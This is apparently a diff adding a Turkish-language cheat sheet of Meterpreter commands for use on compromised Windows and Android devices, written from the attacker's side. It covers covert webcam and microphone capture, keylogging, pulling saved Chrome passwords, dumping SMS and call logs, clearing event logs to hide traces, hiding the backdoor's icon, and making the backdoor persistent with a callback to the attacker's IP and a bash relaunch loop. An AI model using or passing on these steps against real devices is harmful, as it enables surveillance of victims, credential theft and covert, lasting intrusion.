@@ -1,0 +1,54 @@
+Meterpreter ile Yapabileceğimiz İşlemler:
+    (Windows)
+    Ekran Görüntüsü Almak:
+        ->screenshot -p <kayıt yolu ve adı> -q <görüntü kalites(max=100)>
+    Sistem Özellikleri Öğrenmek:
+        ->sysinfo
+    Dosya işlemleri:
+        ->ls  (Komutu ile bulunduğumuz dizindeki tüm dosyaları listeleriz.)
+        -> download -r <dosya adı>  (Komutu ile hedef cihazdan kendi bilgisayarımıza dosya indirebiliriz.)
+    Kameradan Görüntü Almak:
+        ->webcam_list (Komutu ile kameraları listeliyoruz.)
+        ->webcam_snap <kamera numarası> (Kameradan fotoğraf alır.)
+        ->webcam_stream <kamera numarası> (Kamerayı canlı olarak izlememize ve kaydetmemizi sağlar.)
+    Ses Kaydı Almak:
+        ->record_mic (Sonlandırana kadar ses kaydı almaya devam eder. -d parametresi ile saniye cinsinden süre belirlenebilir.)
+    Browserdan Veri Çekmek:
+        ->run post/windows/gather/enum_chrome (Komutu ile chrome'a kayıtlı şifreleri kullanıcı adlarını vs çekebiliriz.)
+    Keylogger:
+        ->keyscan_start (Komutu klavye tıklamalarının hepsini kaydeder.)
+        ->keyscan_dump (Komutu iste kaydedilen verileri görmemizi sağlar.)
+    İzleri Silmek:
+        ->run event_manager -c (Komutu ile log kayıtlarını temizleyerek izimizi kaybettirmiş oluyoruz.)
+    Backdoorun Kalıcılığını Sağlamak:
+        ->run persistence -A -U -i <sistem açıldıktan sonra backdoorun başlama saniyesi> -p <port> -r <kali_ip veya domain>
+        
+        Kalıcılığı sağladıktan sonra exit yazarak çıkış yaparsak kalıcılık kapanır bu yüzden konsol ekranının kapatma simgesine tıklayarak kapatmalıyız.
+        
+    (Android)
+    Sms Kayıtlarını Almak:
+        dump_sms
+    Kameradan Yayın ve Görüntü Almak.
+        ->webcam_list (Komutu ile kameraları listeliyoruz.)
+        ->webcam_snap <kamera numarası> (Kameradan fotoğraf alır.)
+        ->webcam_stream <kamera numarası> (Kamerayı canlı olarak izlememize ve kaydetmemizi sağlar.)
+    Arama Kayıtları Alma:
+        ->dump_callog
+    Ses Kaydı Almak:
+        record_mic (Sonlandırana kadar ses kaydı almaya devam eder. -d parametresi ile saniye cinsinden süre belirlenebilir.)
+    Backdoor'u Gizleme:
+        ->hide_app_icon
+    Backdoor'u Kalıcı Hale Getirmek:
+        Başka bir terminal ekranında nano kalicilik.sh komutu ile dosya oluşturuyoruz ve içerisine aşağıdaki kodları yapıştırıyoruz.
+        #!/bin/bash
+        while:
+        do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
+        sleep 20
+        done
+        
+        CTRL+O kombinasyonu ile dosyayı kaydediyoruz ve çıkıyoruz. Sonrasında dosy çalıştırma yetkisi verelim bunun için;
+        ->chmod +x kalicilik.sh
+        Meterpreter terminalimizden ;
+        ->upload <dosy dizni/kalicilik.sh>
+        ->shell
+        Komutu ile kalıcılık kazanmış oluyoruz. Ama malesefki bu kalıcılık işlemi android 6 sürümünün altındakilerde çalışmakta.
